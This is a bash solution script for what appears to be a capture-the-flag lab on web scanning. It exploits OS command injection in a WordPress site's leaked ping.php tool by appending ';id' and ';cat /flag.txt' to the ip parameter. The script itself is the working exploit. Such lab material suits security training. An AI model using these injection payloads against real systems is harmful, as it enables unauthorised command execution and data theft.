#!/bin/bash
# ZAP-scanner exercise (target: 154.57.164.81:38220)
# Question 1: find the high-level vulnerability and read /flag.txt
#
# The site is WordPress 5.8 with directory listings enabled. The approved comment
# on the "Customer Support" post leaks a dev tool:
#     /devtools/ping.php?ip=127.0.0.1
# ping.php passes the ip parameter straight to the shell, i.e. OS command
# injection (the "High" risk finding ZAP raises for this parameter), which lets us
# read the flag.
set -u
BASE="${1:-http://154.57.164.81:38220}"

echo "== 1) directory listing / devtools"
curl -s --max-time 20 "$BASE/devtools/" | grep -oE 'href="[^"]+"' | sed 's/href=//'

echo "== 2) confirm command injection"
curl -s --max-time 20 "$BASE/devtools/ping.php?ip=127.0.0.1;id" \
  | grep -oE 'uid=[0-9]+\([^)]*\)'

echo "== 3) read the flag"
curl -s --max-time 20 "$BASE/devtools/ping.php?ip=127.0.0.1;cat%20/flag.txt" \
  | grep -oE 'HTB\{[^}]*\}'
